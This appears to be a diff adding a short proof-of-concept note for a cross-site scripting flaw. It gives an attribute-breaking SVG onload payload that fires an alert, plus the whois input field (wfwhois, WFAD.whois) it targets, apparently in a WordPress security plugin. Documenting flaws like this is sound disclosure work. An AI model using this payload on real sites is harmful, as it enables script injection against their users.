@@ -1,0 +1,7 @@
+###########################################################################################
+Vector: "><svg/onload=alert(/Pentest Criminal Laoin (XSS)/)>
+
+Input: <input id="wfwhois" type="text" onkeydown="if(event.keyCode == 13){
+WFAD.whois(jQuery('#wfwhois').val()); }"
+
+###########################################################################################
